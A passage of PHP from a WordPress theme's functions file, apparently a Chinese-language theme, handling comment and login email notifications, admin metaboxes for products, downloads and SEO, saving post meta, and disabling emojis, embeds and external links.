    $spam_confirmed = $comment->comment_approved;
    //给父级评论提醒
    if ($parent_id != '' && $spam_confirmed != 'spam' && $notify == '1' && $parent_email != $comment_author_email) {
        $parent_author = trim($parent_comment->comment_author);
        $parent_comment_date = trim($parent_comment->comment_date);
        $parent_comment_content = nl2br($parent_comment->comment_content);
        $args = array(
            'parentAuthor' => $parent_author,
            'parentCommentDate' => $parent_comment_date,
            'parentCommentContent' => $parent_comment_content,
            'postTitle' => $post->post_title,
            'commentAuthor' => $comment_author,
            'commentDate' => $comment_date,
            'commentContent' => $comment_content,
            'commentLink' => $comment_link,
        );
        if (filter_var($post_author_email, FILTER_VALIDATE_EMAIL)) {
            tt_mail('', $parent_email, sprintf(__('%1$s在%2$s中回复你', 'tt'), $comment_object->comment_author, $post->post_title), $args, 'reply');
        }
        if ($parent_comment->user_id) {
            tt_create_message($parent_comment->user_id, $comment->user_id, $comment_author, 'comment', sprintf(__('我在%1$s中回复了你', 'tt'), $post->post_title), $comment_content);
        }
    }

    //给文章作者的通知
    if ($post_author_email != $comment_author_email && $post_author_email != $parent_email) {
        $args = array(
            'postTitle' => $post->post_title,
            'commentAuthor' => $comment_author,
            'commentContent' => $comment_content,
            'commentLink' => $comment_link,
        );
        if (filter_var($post_author_email, FILTER_VALIDATE_EMAIL)) {
            tt_mail('', $post_author_email, sprintf(__('%1$s在%2$s中回复你', 'tt'), $comment_author, $post->post_title), $args, 'comment');
        }
        tt_create_message($post->post_author, 0, 'System', 'notification', sprintf(__('%1$s在%2$s中回复你', 'tt'), $comment_author, $post->post_title), $comment_content);
    }

    //给管理员通知
    if ($post_author_email != $admin_email && $parent_id != $admin_email && $admin_notify == '1') {
        $args = array(
            'postTitle' => $post->post_title,
            'commentAuthor' => $comment_author,
            'commentContent' => $comment_content,
            'commentLink' => $comment_link,
        );
        tt_mail('', $admin_email, sprintf(__('%1$s上的文章有了新的回复', 'tt'), get_bloginfo('name')), $args, 'comment-admin');
        //tt_create_message() //TODO
    }
}
//add_action('comment_post', 'tt_comment_mail_notify');
add_action('wp_insert_comment', 'tt_comment_mail_notify', 99, 2);

function tt_wp_login_notify($user_login)
{
    if (!tt_get_option('tt_login_success_notify')) {
        return;
    }
    date_default_timezone_set('Asia/Shanghai');
    $admin_email = get_bloginfo('admin_email');
    $subject = __('你的博客空间登录提醒', 'tt');
    $args = array(
        'loginName' => $user_login,
        'ip' => $_SERVER['REMOTE_ADDR'],
    );
    tt_async_mail('', $admin_email, $subject, $args, 'login');
    //tt_mail('', $admin_email, $subject, $args, 'login');
}
add_action('wp_login', 'tt_wp_login_notify', 10, 1);

function tt_wp_login_failure_notify($login_name)
{
    if (!tt_get_option('tt_login_failure_notify')) {
        return;
    }
    date_default_timezone_set('Asia/Shanghai');
    $admin_email = get_bloginfo('admin_email');
    $subject = __('你的博客空间登录错误警告', 'tt');
    $args = array(
        'loginName' => $login_name,
        'ip' => $_SERVER['REMOTE_ADDR'],
    );
    tt_async_mail('', $admin_email, $subject, $args, 'login-fail');
}
add_action('wp_login_failed', 'tt_wp_login_failure_notify', 10, 1);

function tt_pending_to_publish($post)
{
    $rec_post_num = (int) tt_get_option('tt_rec_post_num', '5');
    $rec_post_credit = (int) tt_get_option('tt_rec_post_credit', '50');
    $rec_post = (int) get_user_meta($post->post_author, 'tt_rec_post', true);
    if ($rec_post < $rec_post_num && $rec_post_credit) {
        //添加积分
        tt_update_user_credit($post->post_author, $rec_post_credit, sprintf(__('获得文章投稿奖励%1$s积分', 'tt'), $rec_post_credit), false);
        //发送邮件
        $user = get_user_by('id', $post->post_author);
        $user_email = $user->user_email;
        if (filter_var($user_email, FILTER_VALIDATE_EMAIL)) {
            $subject = sprintf(__('你在%1$s上有新的文章发表', 'tt'), get_bloginfo('name'));
            $args = array(
                'postAuthor' => $user->display_name,
                'postLink' => get_permalink($post->ID),
                'postTitle' => $post->post_title,
            );
            tt_async_mail('', $user_email, $subject, $args, 'contribute-post');
        }
    }
    update_user_meta($post->post_author, 'tt_rec_post', $rec_post + 1);
}
add_action('pending_to_publish', 'tt_pending_to_publish', 10, 1);
add_action('tt_immediate_to_publish', 'tt_pending_to_publish', 10, 1);

function tt_open_vip_email($user_id, $type, $start_time, $end_time)
{
    $user = get_user_by('id', $user_id);
    if (!$user) {
        return;
    }
    $user_email = $user->user_email;
    $subject = __('会员状态变更提醒', 'tt');
    $vip_type_des = tt_get_member_type_string($type);
    $args = array(
        'adminEmail' => get_option('admin_email'),
        'vipType' => $vip_type_des,
        'startTime' => $start_time,
        'endTime' => $end_time,
    );
    tt_async_mail('', $user_email, $subject, $args, 'open-vip');
}

function tt_promote_vip_email($user_id, $type, $start_time, $end_time)
{
    $user = get_user_by('id', $user_id);
    if (!$user) {
        return;
    }
    $user_email = $user->user_email;
    $subject = __('会员状态变更提醒', 'tt');
    $vip_type_des = tt_get_member_type_string($type);
    $args = array(
        'adminEmail' => get_option('admin_email'),
        'vipType' => $vip_type_des,
        'startTime' => $start_time,
        'endTime' => $end_time,
    );
    tt_async_mail('', $user_email, $subject, $args, 'promote-vip');
}

function tt_add_metaboxes()
{
    // 嵌入商品
    add_meta_box(
        'tt_post_embed_product',
        __('Post Embed Product', 'tt'),
        'tt_post_embed_product_callback',
        'post',
        'normal', 'high'
    );
     // 文章右侧下载小工具
    add_meta_box(
        'tt_post_embed_down_info',
        __('文章右侧下载小工具', 'tt'),
        'tt_post_embed_down_info_widget',
        'post',
        'normal', 'high'
    );
    // 转载信息
    add_meta_box(
        'tt_copyright_content',
        __('Post Copyright Info', 'tt'),
        'tt_post_copyright_callback',
        'post',
        'normal', 'high'
    );
    // 自定义SEO数据
    add_meta_box(
        'tt_post_seo_metabox',
        __('自定义SEO数据', 'tt'),
        'tt_post_seo_metabox_callback',
        'post',
        'normal', 'high'
    );
    // 文章内嵌下载资源
    add_meta_box(
        'tt_dload_metabox',
        __('普通与积分收费下载', 'tt'),
        'tt_download_metabox_callback',
        'post',
        'normal', 'high'
    );
    // 页面关键词与描述
    add_meta_box(
        'tt_keywords_description',
        __('页面关键词与描述', 'tt'),
        'tt_keywords_description_callback',
        'page',
        'normal', 'high'
    );
    // 商品信息输入框
    add_meta_box(
        'tt_product_info',
        __('商品信息', 'tt'),
        'tt_product_info_callback',
        'product',
        'normal', 'high'
    );
    // 微博图床自动替换
    add_meta_box(
			'post_weibo_image',
			 '微博图床自动替换',
			'tt_post_weibo_image_metabox_callback',
			Array('post','page','product'),
			'side','low'
		);
}
add_action('add_meta_boxes', 'tt_add_metaboxes');

function tt_post_embed_product_callback($post)
{
    $embed_product = (int) get_post_meta($post->ID, 'tt_embed_product', true); ?>
    <p style="width:100%;">
        <?php _e('Embed Product ID', 'tt'); ?>
        <input name="tt_embed_product" class="small-text code" value="<?php echo $embed_product;?>" style="width:80px;height: 28px;">
        <?php _e('(Leave empty or zero to disable)', 'tt'); ?>
    </p>
    <?php
}

function tt_post_embed_down_info_widget($post)
{
  
    $post_embed_down_info = maybe_unserialize(get_post_meta($post->ID, 'tt_embed_down_info', true));
    $option = $post_embed_down_info[0];
    $demo_url = $post_embed_down_info[1];
    $file_version = $post_embed_down_info[2];
    $file_format = $post_embed_down_info[3];
    $file_size = $post_embed_down_info[4];
    $file_require = $post_embed_down_info[5];
    ?>
    <p>请选择开启或关闭
      <select name="tt_embed_down_info_option">
            <option value="0" <?php if( $option!=1) echo 'selected="selected"';?>>关闭</option>
            <option value="1" <?php if( $option==1) echo 'selected="selected"';?>>启用</option>
        </select>
    </p>
    <p>演示地址（留空则不显示）</p>
        <input type="text" name="tt_embed_down_info_demo_url" class="large-text code" value="<?php echo $demo_url;?>">
    <p>当前版本（留空则不显示）</p>
        <input type="text" name="tt_embed_down_info_file_version" class="large-text code" value="<?php echo $file_version;?>">
    <p>文件格式（留空则不显示）</p>
        <input type="text" name="tt_embed_down_info_file_format" class="large-text code" value="<?php echo $file_format;?>">
    <p>文件大小（留空则不显示）</p>
        <input type="text" name="tt_embed_down_info_file_size" class="large-text code" value="<?php echo $file_size;?>">
    <p>安装要求（留空则不显示）</p>
        <input type="text" name="tt_embed_down_info_file_require" class="large-text code" value="<?php echo $file_require;?>">
    <?php
}

function tt_post_copyright_callback($post)
{
    $cc = get_post_meta($post->ID, 'tt_post_copyright', true);
    $cc = $cc ? maybe_unserialize($cc) : array('source_title' => '', 'source_link' => ''); ?>
    <p><?php _e('Post Source Title', 'tt'); ?></p>
    <textarea name="tt_source_title" rows="1" class="large-text code"><?php echo stripcslashes(htmlspecialchars_decode($cc['source_title'])); ?></textarea>
    <p><?php _e('Post Source Link, leaving empty means the post is original article', 'tt'); ?></p>
    <textarea name="tt_source_link" rows="1" class="large-text code"><?php echo stripcslashes(htmlspecialchars_decode($cc['source_link'])); ?></textarea>
    <?php
}

function tt_download_metabox_callback( $post ) {
    
    //付费显示内容
    $currency = get_post_meta($post->ID, 'tt_sale_content_currency', true); // 0 - credit 1 - cash
    $price = get_post_meta($post->ID, 'tt_sale_content_price', true);
    //免费下载资源
    $free_dl = get_post_meta( $post->ID, 'tt_free_dl', true ) ? : '';
    //付费下载资源
    $sale_dl2 = get_post_meta( $post-> ID, 'tt_sale_dl2', true) ? : '';
    ?>
    <p style="clear:both;font-weight:bold;border-bottom:1px solid #ddd;padding-bottom:8px;">
        <?php _e('付费显示内容，使用付费可见短代码后必须设置价格和支付币种', 'tt'); ?>
    </p>
    <p style="width:50%;float:left;"><?php _e( '选择支付币种', 'tt' );?>
        <select name="tt_sale_content_currency">
            <option value="0" <?php if( $currency!=1) echo 'selected="selected"';?>><?php _e( '积分', 'tt' );?></option>
            <option value="1" <?php if( $currency==1) echo 'selected="selected"';?>><?php _e( '人民币', 'tt' );?></option>
        </select>
    </p>
    <p style="width:50%;float:left;"><?php _e( '商品售价 ', 'tt' );?>
        <input name="tt_sale_content_price" class="small-text code" value="<?php echo sprintf('%0.2f', $price);?>" style="width:80px;height: 28px;">
    </p>
    <p style="clear:both;font-weight:bold;border-bottom:1px solid #ddd;padding-bottom:8px;"></p>
    <p><?php _e( '普通下载资源，格式为 资源1名称|资源1url|下载密码,资源2名称|资源2url|下载密码 资源名称与url用|隔开，一行一个资源记录，url请添加http://头，如提供百度网盘加密下载可以填写密码，也可以留空', 'tt' );?></p>
    <textarea name="tt_free_dl" rows="5" cols="50" class="large-text code"><?php echo stripcslashes(htmlspecialchars_decode($free_dl));?></textarea>
    <p><?php _e( '收费下载资源，格式为 资源名称|资源下载url1__密码1,资源下载url2__密码2|资源价格|币种(cash或credit)，一行一个资源记录', 'tt' );?></p>
    <textarea name="tt_sale_dl2" rows="5" cols="50" class="large-text code"><?php echo stripcslashes(htmlspecialchars_decode($sale_dl2));?></textarea>
    <?php
}

function tt_post_seo_metabox_callback( $post ) {
    $tkd = get_post_meta($post->ID, 'tt_post_seo', true);
    $tkd = $tkd ? maybe_unserialize($tkd) : array('tt_post_title' => '', 'tt_post_keywords' => '', 'tt_post_description' => '');
    //文章SEO标题
    $title = $tkd['tt_post_title'];
    //文章页keywords
    $keywords = $tkd['tt_post_keywords'];
    //文章页description
    $description = $tkd['tt_post_description'];
     ?>
    <p><?php _e( '自定义文章页SEO标题，留空将按默认显示', 'tt' );?></p>
    <input type="text" name="tt_post_title" class="large-text code" value="<?php echo $title;?>">
    <p><?php _e( '自定义文章页keywords，留空将按默认显示', 'tt' );?></p>
    <input type="text" name="tt_post_keywords" class="large-text code" value="<?php echo $keywords;?>">
    <p><?php _e( '自定义文章页description，留空将按默认显示', 'tt' );?></p>
    <input type="text" name="tt_post_description" class="large-text code" value="<?php echo $description;?>">
    <?php
}


function tt_post_weibo_image_metabox_callback($post){
	$post_disable_weibo_image = get_post_meta( $post->ID, 'tt_post_enable_weibo_image', true );
?>
<p><?php _e( '如果主题选项中开启了微博图床功能，则此设置有效。', 'tinection' );?></p>
<label for="tt_post_enable_weibo_image">
	<input name="tt_post_enable_weibo_image" id="tt_post_enable_weibo_image" value="enable" type="checkbox" <?php if( $post_disable_weibo_image=='enable' ) echo 'checked="checked"';?>>启用本文微博图床功能。
</label>
<hr>
<p><?php echo '点此重置此篇文章微博图片为原图片';?></p>
<a class="button" href="<?php echo home_url('/') .'site/weibo_image_rest?post_id='.$post->ID;?>" target="_blank">点击重置</a>
<?php
}

function tt_keywords_description_callback($post)
{
    $keywords = get_post_meta($post->ID, 'tt_keywords', true);
    $description = get_post_meta($post->ID, 'tt_description', true); ?>
    <p><?php _e('页面关键词', 'tt'); ?></p>
    <textarea name="tt_keywords" rows="2" class="large-text code"><?php echo stripcslashes(htmlspecialchars_decode($keywords)); ?></textarea>
    <p><?php _e('页面描述', 'tt'); ?></p>
    <textarea name="tt_description" rows="5" class="large-text code"><?php echo stripcslashes(htmlspecialchars_decode($description)); ?></textarea>

    <?php
}

function tt_product_info_callback($post)
{
    $currency = get_post_meta($post->ID, 'tt_pay_currency', true); // 0 - credit 1 - cash
    $channel = get_post_meta($post->ID, 'tt_buy_channel', true) == 'taobao' ? 'taobao' : 'instation';
    $price = get_post_meta($post->ID, 'tt_product_price', true);
    $amount = get_post_meta($post->ID, 'tt_product_quantity', true);

    $taobao_link_raw = get_post_meta($post->ID, 'tt_taobao_link', true);
    $taobao_link = $taobao_link_raw ? esc_url($taobao_link_raw) : '';
    $sale_text = get_post_meta($post->ID, 'tt_product_sale_text',true);

    // 注意，折扣保存的是百分数的数值部分
    $discount_summary = tt_get_product_discount_array($post->ID); // 第1项为普通折扣, 第2项为会员(月付)折扣, 第3项为会员(年付)折扣, 第4项为会员(永久)折扣
    $site_discount = $discount_summary[0];
    $monthly_vip_discount = $discount_summary[1];
    $annual_vip_discount = $discount_summary[2];
    $permanent_vip_discount = $discount_summary[3];

    //$promote_code_support = get_post_meta($post->ID, 'tt_promote_code_support', true) ? (int)get_post_meta($post->ID, 'tt_promote_code_support', true) : 0;
    //$promote_discount = get_post_meta($post->ID,'product_promote_discount',true);
    //$promote_discount = empty($promote_discount) ? 1 : $promote_discount;;
    //$discount_begin_date = get_post_meta($post->ID,'product_discount_begin_date',true);
    //$discount_period = get_post_meta($post->ID,'product_discount_period',true);
    $download_links = get_post_meta($post->ID, 'tt_product_download_links', true);
    $pay_content = get_post_meta($post->ID, 'tt_product_pay_content', true);
    $buyer_emails_string = tt_get_buyer_emails($post->ID);
    $buyer_emails = is_array($buyer_emails_string) ? implode(';', $buyer_emails_string) : ''; ?>
    <p style="clear:both;font-weight:bold;">
        <?php echo sprintf(__('此商品购买按钮快捷插入短代码为[product id="%1$s"][/product]', 'tt'), $post->ID); ?>
    </p>
    <p style="clear:both;font-weight:bold;border-bottom:1px solid #ddd;padding-bottom:8px;">
        <?php _e('基本信息', 'tt'); ?>
    </p>
    <p style="width:20%;float:left;"><?php _e('选择支付币种', 'tt'); ?>
        <select name="tt_pay_currency">
            <option value="0" <?php if ($currency != 1) {
        echo 'selected="selected"';
    } ?>><?php _e('积分', 'tt'); ?></option>
            <option value="1" <?php if ($currency == 1) {
        echo 'selected="selected"';
    } ?>><?php _e('人民币', 'tt'); ?></option>
        </select>
    </p>
    <p style="width:20%;float:left;"><?php _e('选择购买渠道', 'tt'); ?>
        <select name="tt_buy_channel">
            <option value="instation" <?php if ($channel != 'taobao') {
        echo 'selected="selected"';
    } ?>><?php _e('站内购买', 'tt'); ?></option>
            <option value="taobao" <?php if ($channel == 'taobao') {
        echo 'selected="selected"';
    } ?>><?php _e('淘宝链接', 'tt'); ?></option>
        </select>
    </p>
    <p style="width:20%;float:left;"><?php _e('商品售价 ', 'tt'); ?>
        <input name="tt_product_price" class="small-text code" value="<?php echo sprintf('%0.2f', $price); ?>" style="width:80px;height: 28px;">
    </p>
    <p style="width:20%;float:left;"><?php _e('商品数量 ', 'tt'); ?>
        <input name="tt_product_quantity" class="small-text code" value="<?php echo (int) $amount; ?>" style="width:80px;height: 28px;">
    </p>
    <p style="clear:both;font-weight:bold;border-bottom:1px solid #ddd;padding-bottom:8px;">
        <?php _e('VIP会员折扣百分数(100代表原价)', 'tt'); ?>
    </p>
    <p style="width:33%;float:left;clear:left;"><?php _e('VIP月费会员折扣 ', 'tt'); ?>
        <input name="tt_monthly_vip_discount" class="small-text code" value="<?php echo $monthly_vip_discount; ?>" style="width:80px;height: 28px;"> %
    </p>
    <p style="width:33%;float:left;"><?php _e('VIP年费会员折扣 ', 'tt'); ?>
        <input name="tt_annual_vip_discount" class="small-text code" value="<?php echo $annual_vip_discount; ?>" style="width:80px;height: 28px;"> %
    </p>
    <p style="width:33%;float:left;"><?php _e('VIP永久会员折扣 ', 'tt'); ?>
        <input name="tt_permanent_vip_discount" class="small-text code" value="<?php echo $permanent_vip_discount; ?>" style="width:80px;height: 28px;"> %
    </p>
    <p style="clear:both;font-weight:bold;border-bottom:1px solid #ddd;padding-bottom:8px;">
        <?php _e('促销信息', 'tt'); ?>
    </p>
    <p style="width:50%;float:left;clear:left;"><?php _e( '优惠促销折扣(100代表原价)', 'tt' );?>
        <input name="tt_product_promote_discount" class="small-text code" value="<?php echo $site_discount; ?>" style="width:80px;height: 28px;"> %
    </p>
    <p style="width:50%;float:left;"><?php _e( '促销标语(留空不显示)', 'tt' );?>
        <input name="tt_product_sale_text" class="small-text code" value="<?php echo $sale_text; ?>" style="width:120px;height: 28px;">(四字以内)
    </p>
    <p style="clear:both;font-weight:bold;border-bottom:1px solid #ddd;padding-bottom:8px;">
        <?php _e('淘宝链接', 'tt'); ?>
    </p>
    <p style="clear:both;"><?php _e('购买渠道为淘宝时，请务必填写该项', 'tt'); ?></p>
    <textarea name="tt_taobao_link" rows="2" class="large-text code"><?php echo $taobao_link; ?></textarea>
    <p style="clear:both;font-weight:bold;border-bottom:1px solid #ddd;padding-bottom:8px;">
        <?php _e('付费内容', 'tt'); ?>
    </p>
    <p style="clear:both;"><?php _e('付费查看下载链接,一行一个,每个资源格式为资源名|资源下载链接|密码', 'tt'); ?></p>
    <textarea name="tt_product_download_links" rows="5" class="large-text code"><?php echo $download_links; ?></textarea>
    <p style="clear:both;"><?php _e('付费查看的内容信息', 'tt'); ?></p>
    <textarea name="tt_product_pay_content" rows="5" class="large-text code"><?php echo $pay_content; ?></textarea>

    <p style="clear:both;"><?php _e('当前购买的用户邮箱', 'tt'); ?></p>
    <textarea name="tt_product_buyer_emails" rows="6" class="large-text code"><?php echo $buyer_emails; ?></textarea>

    <?php
}

function tt_save_meta_box_data($post_id)
{
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }
    // 检查用户权限
    if (isset($_POST['post_type']) && 'page' == $_POST['post_type']) {
        if (!current_user_can('edit_page', $post_id)) {
            return;
        }
    } else {
        if (!current_user_can('edit_post', $post_id)) {
            return;
        }
    }
    // 检查和更新字段
    if (isset($_POST['tt_embed_product'])) {
        update_post_meta($post_id, 'tt_embed_product', absint($_POST['tt_embed_product']));
    }

    if (isset($_POST['tt_source_title']) && isset($_POST['tt_source_link'])) {
        $cc = array(
            'source_title' => trim($_POST['tt_source_title']),
            'source_link' => trim($_POST['tt_source_link']),
        );
        update_post_meta($post_id, 'tt_post_copyright', maybe_serialize($cc));
    }
   
    if (isset($_POST['tt_post_title']) || isset($_POST['tt_post_keywords']) || isset($_POST['tt_post_description'])) {
        $tkd = array(
            'tt_post_title' => trim($_POST['tt_post_title']),
            'tt_post_keywords' => trim($_POST['tt_post_keywords']),
            'tt_post_description' => trim($_POST['tt_post_description']),
        );
        update_post_meta($post_id, 'tt_post_seo', maybe_serialize($tkd));
    }
    
    if(isset($_POST['tt_sale_content_currency'])){
        $currency = (int)$_POST['tt_sale_content_currency'] == 1 ? 1 : 0;
        update_post_meta($post_id, 'tt_sale_content_currency', $currency);
    }
    if(isset($_POST['tt_sale_content_price'])){
        update_post_meta($post_id, 'tt_sale_content_price', abs($_POST['tt_sale_content_price']));
    }

    if (isset($_POST['tt_free_dl'])/* && !empty($_POST['tt_free_dl'])*/) {
        update_post_meta($post_id, 'tt_free_dl', trim($_POST['tt_free_dl']));
    }

    if (isset($_POST['tt_sale_dl'])/* && !empty($_POST['tt_sale_dl'])*/) {
        update_post_meta($post_id, 'tt_sale_dl', trim($_POST['tt_sale_dl']));
    }

    if (isset($_POST['tt_sale_dl2'])/* && !empty($_POST['tt_sale_dl'])*/) {
        update_post_meta($post_id, 'tt_sale_dl2', trim($_POST['tt_sale_dl2']));
    }

    if (isset($_POST['tt_keywords']) && !empty($_POST['tt_keywords'])) {
        update_post_meta($post_id, 'tt_keywords', trim($_POST['tt_keywords']));
    }

    if (isset($_POST['tt_description']) && !empty($_POST['tt_description'])) {
        update_post_meta($post_id, 'tt_description', trim($_POST['tt_description']));
    }

    if (isset($_POST['tt_pay_currency'])) {
        $currency = (int) $_POST['tt_pay_currency'] == 1 ? 1 : 0;
        update_post_meta($post_id, 'tt_pay_currency', $currency);
    }

    if (isset($_POST['tt_buy_channel'])) {
        $channel = trim($_POST['tt_buy_channel']) == 'taobao' ? 'taobao' : 'instation';
        update_post_meta($post_id, 'tt_buy_channel', $channel);
    }
    
    if ($_POST['action'] == 'editpost' && $_POST['tt_post_enable_weibo_image']!=get_post_meta($post_id,'tt_post_enable_weibo_image',true)) {
        $tt_post_enable_weibo_image = $_POST['tt_post_enable_weibo_image'] == 'enable' ? 'enable' : 'disabled';
		update_post_meta($post_id, 'tt_post_enable_weibo_image', $tt_post_enable_weibo_image);
	}

    if (isset($_POST['tt_taobao_link'])) {
        update_post_meta($post_id, 'tt_taobao_link', esc_url($_POST['tt_taobao_link']));
    }

    if (isset($_POST['tt_product_price'])) {
        update_post_meta($post_id, 'tt_product_price', abs($_POST['tt_product_price']));
    }

    if (isset($_POST['tt_product_quantity'])) {
        update_post_meta($post_id, 'tt_product_quantity', absint($_POST['tt_product_quantity']));
    }

    if (isset($_POST['tt_product_promote_discount']) && isset($_POST['tt_monthly_vip_discount']) && isset($_POST['tt_annual_vip_discount']) && isset($_POST['tt_permanent_vip_discount'])) {
        $discount_summary = array(
            absint($_POST['tt_product_promote_discount']),
            absint($_POST['tt_monthly_vip_discount']),
            absint($_POST['tt_annual_vip_discount']),
            absint($_POST['tt_permanent_vip_discount']),
        );
        update_post_meta($post_id, 'tt_product_discount', maybe_serialize($discount_summary));
    }
    
    if(isset($_POST['tt_product_sale_text'])){
        update_post_meta($post_id, 'tt_product_sale_text', trim($_POST['tt_product_sale_text']));
    }
     
    if (isset($_POST['tt_product_download_links'])) {
        update_post_meta($post_id, 'tt_product_download_links', trim($_POST['tt_product_download_links']));
    }

    if (isset($_POST['tt_product_pay_content'])) {
        update_post_meta($post_id, 'tt_product_pay_content', trim($_POST['tt_product_pay_content']));
    } 
    
    if (isset($_POST['tt_embed_down_info_option']) || isset($_POST['tt_embed_down_info_demo_url']) || isset($_POST['tt_embed_down_info_file_version']) || isset($_POST['tt_embed_down_info_file_format']) || isset($_POST['tt_embed_down_info_file_size']) || isset($_POST['tt_embed_down_info_file_require'])) {
        $tt_embed_down_info = array(
            $_POST['tt_embed_down_info_option'],
            $_POST['tt_embed_down_info_demo_url'],
            $_POST['tt_embed_down_info_file_version'],
            $_POST['tt_embed_down_info_file_format'],
            $_POST['tt_embed_down_info_file_size'],
            $_POST['tt_embed_down_info_file_require'],
        );
        update_post_meta($post_id, 'tt_embed_down_info', maybe_serialize($tt_embed_down_info));
    }
}
add_action('save_post', 'tt_save_meta_box_data');

function tt_get_header($name = null)
{
    do_action('get_header', $name);

    $templates = array();
    $name = (string) $name;
    if ('' !== $name) {
        $templates[] = 'core/modules/mod.Header.'.ucfirst($name).'.php';
    }

    $templates[] = 'core/modules/mod.Header.php';

    locate_template($templates, true);
}

function tt_get_footer($name = null)
{
    do_action('get_footer', $name);

    $templates = array();
    $name = (string) $name;
    if ('' !== $name) {
        $templates[] = 'core/modules/mod.Footer.'.ucfirst($name).'.php';
    }

    $templates[] = 'core/modules/mod.Footer.php';

    locate_template($templates, true);
}

function tt_get_sidebar($name = null)
{
    do_action('get_sidebar', $name);

    $templates = array();
    $name = (string) $name;
    if ('' !== $name) {
        $templates[] = 'core/modules/mod.Sidebar'.ucfirst($name).'.php';
    }

    $templates[] = 'core/modules/mod.Sidebar.php';

    locate_template($templates, true);
}

function tt_remove_open_sans()
{
    wp_deregister_style('open-sans');
    wp_register_style('open-sans', false);
    wp_enqueue_style('open-sans', '');
}
add_action('init', 'tt_remove_open_sans');

/* 移除头部多余信息 */
function tt_remove_wp_version()
{
    return;
}
add_filter('the_generator', 'tt_remove_wp_version'); //WordPress的版本号

remove_action('wp_head', 'feed_links', 2); //包含文章和评论的feed
remove_action('wp_head', 'index_rel_link'); //当前文章的索引
remove_action('wp_head', 'feed_links_extra', 3); //额外的feed,例如category, tag页
remove_action('wp_head', 'start_post_rel_link', 10); //开始篇
remove_action('wp_head', 'parent_post_rel_link', 10); //父篇
remove_action('wp_head', 'adjacent_posts_rel_link', 10); //上、下篇.
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10); //rel=pre
remove_action('wp_head', 'wp_shortlink_wp_head', 10); //rel=shortlink

function tt_no_self_ping(&$links)
{
    $home = get_option('home');
    foreach ($links as $key => $link) {
        if (0 === strpos($link, $home)) {
            unset($links[$key]);
        }
    }
}
add_action('pre_ping', 'tt_no_self_ping');

add_filter('pre_option_link_manager_enabled', '__return_true');

add_filter('show_admin_bar', '__return_false');

remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('admin_print_styles', 'print_emoji_styles');
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('embed_head', 'print_emoji_detection_script');
remove_filter('the_content_feed', 'wp_staticize_emoji');
remove_filter('comment_text_rss', 'wp_staticize_emoji');
remove_filter('wp_mail', 'wp_staticize_emoji_for_email');

function tt_disable_emoji_tiny_mce_plugin($plugins)
{
    return array_diff($plugins, array('wpemoji'));
}
add_filter('tiny_mce_plugins', 'tt_disable_emoji_tiny_mce_plugin');

function tt_disable_embeds_init()
{
    /* @var WP $wp */
    global $wp;

    // Remove the embed query var.
    $wp->public_query_vars = array_diff($wp->public_query_vars, array(
        'embed',
    ));

    // Remove the REST API endpoint.
    remove_action('rest_api_init', 'wp_oembed_register_route');

    // Turn off oEmbed auto discovery.
    add_filter('embed_oembed_discover', '__return_false');

    // Don't filter oEmbed results.
    remove_filter('oembed_dataparse', 'wp_filter_oembed_result', 10);

    // Remove oEmbed discovery links.
    remove_action('wp_head', 'wp_oembed_add_discovery_links');

    // Remove oEmbed-specific JavaScript from the front-end and back-end.
    remove_action('wp_head', 'wp_oembed_add_host_js');
    add_filter('tiny_mce_plugins', 'tt_disable_embeds_tiny_mce_plugin');

    // Remove all embeds rewrite rules.
    add_filter('rewrite_rules_array', 'tt_disable_embeds_rewrites');

    // Remove filter of the oEmbed result before any HTTP requests are made.
    remove_filter('pre_oembed_result', 'wp_filter_pre_oembed_result', 10);
}

add_action('init', 'tt_disable_embeds_init', 9999);

function tt_disable_embeds_tiny_mce_plugin($plugins)
{
    return array_diff($plugins, array('wpembed'));
}

function tt_disable_embeds_rewrites($rules)
{
    foreach ($rules as $rule => $rewrite) {
        if (false !== strpos($rewrite, 'embed=true')) {
            unset($rules[$rule]);
        }
    }

    return $rules;
}

function tt_disable_embeds_remove_rewrite_rules()
{
    add_filter('rewrite_rules_array', 'tt_disable_embeds_rewrites');
    flush_rewrite_rules();
}
add_action('load-themes.php', 'tt_disable_embeds_remove_rewrite_rules');

function tt_disable_embeds_flush_rewrite_rules()
{
    remove_filter('rewrite_rules_array', 'tt_disable_embeds_rewrites');
    flush_rewrite_rules();
}
add_action('after_switch_theme', 'tt_disable_embeds_flush_rewrite_rules');

function tt_search_filter_page($query)
{
    if ($query->is_search) {
        if (isset($query->query['post_type']) && $query->query['post_type'] == 'product') {
            return $query;
        }
        $query->set('post_type', 'post');
    }

    return $query;
}
add_filter('pre_get_posts', 'tt_search_filter_page');

function tt_excerpt_length($length)
{
    return tt_get_option('tt_excerpt_length', $length);
}
add_filter('excerpt_length', 'tt_excerpt_length', 999);

remove_filter('the_excerpt', 'wpautop');
remove_filter('the_content', 'wptexturize');

add_filter('widget_text', 'shortcode_unautop');
add_filter('widget_text', 'do_shortcode');

if (get_option('upload_path') == 'wp-content/uploads' || get_option('upload_path') == null) {
    update_option('upload_path', 'wp-content/uploads');
}

function short_md5($str) {
    return substr(md5($str), 8, 16);
    }
function tt_custom_upload_name($file){
    if(preg_match('/[一-龥]/u',$file['name'])):
        $ext=ltrim(strrchr($file['name'],'.'),'.');
        $filename = mt_rand(10,25) . time() . $file['name'];
        $file['name'] = short_md5($filename) . '.' . $ext;
    endif;

    return $file;
}
add_filter('wp_handle_upload_prefilter', 'tt_custom_upload_name', 5, 1);

function tt_links_to_internal_links($content){
    if(!tt_get_option('tt_disable_external_links', false)) {
        return $content;
    }
   $home = home_url();
        $white_list = tt_get_option('tt_external_link_whitelist');
        $white_links = !empty($white_list) ? explode(PHP_EOL, $white_list) : array();
        array_push($white_links, $home);
        $external = true;
        foreach ($white_links as $white_link) {
                if(strpos($content, trim($white_link))!==false) {
                    $external = false;
                    break;
                }
            }
            if($external===true){
                $new = $home . '/redirect/' . base64_encode($content);
                $content = str_replace($content, $new, $content);
            }
        
   
    return $content;
}
function tt_convert_to_internal_links($content){
    if(!tt_get_option('tt_disable_external_links', false)) {
        return $content;
    }
    preg_match_all('/\shref=(\'|\")(http[^\'\"#]*?)(\'|\")([\s]?)/', $content, $matches);
    if($matches){
        $home = home_url();
        $white_list = tt_get_option('tt_external_link_whitelist');
        $white_links = !empty($white_list) ? explode(PHP_EOL, $white_list) : array();
        array_push($white_links, $home);
        foreach($matches[2] as $val){
            $external = true;
